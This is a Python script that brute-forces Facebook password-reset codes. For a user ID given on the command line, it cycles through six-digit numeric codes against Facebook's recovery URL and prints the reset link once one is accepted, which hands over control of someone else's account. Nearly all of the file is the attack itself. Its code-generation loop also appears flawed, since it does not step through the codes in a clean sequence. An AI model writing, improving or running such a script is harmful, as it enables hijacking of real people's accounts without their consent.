#! /usr/bin/python


import signal
import requests
import sys


def signal_handler(sig, frame):
    print('You pressed Ctrl+C!')
    sys.exit(0)

class GracefulInterruptHandler(object):

    def __init__(self, sig=signal.SIGINT):
        self.sig = sig

    def __enter__(self):

        self.interrupted = False
        self.released = False

        self.original_handler = signal.getsignal(self.sig)

        def handler(signum, frame):
            self.release()
            self.interrupted = True

        signal.signal(self.sig, handler)

        return self

    def __exit__(self, type, value, tb):
        self.release()

    def release(self):

        if self.released:
            return False

        signal.signal(self.sig, self.original_handler)

        self.released = True

        return True

i = 0

array = [0,0,0,0,0,0]
chars = "0123456789"
user_id = sys.argv[1]
lock = False

with GracefulInterruptHandler() as h:
    for i in range(1000000):
        password = ""

        i+=1
        if i % 10000 == 0:
            print(f'{i / 10000} / 100')

        for j in range(6):
            password += chars[array[j]]

        for j in range(6):
            array[j] += 1
            if array[j] >= 10:
                array[j] = 0
                break

        try:
            x = requests.get(f'https://www.facebook.com/recover/password/?u={user_id}&n={password}')
        except:
            if not lock:
                i-=1
                lock = True
            continue
        lock = False
        if 'password_new' in x.text:
            print(f'connect to https://www.facebook.com/recover/password/?u={user_id}&n={password}')
            sys.exit()

        if h.interrupted:
            break
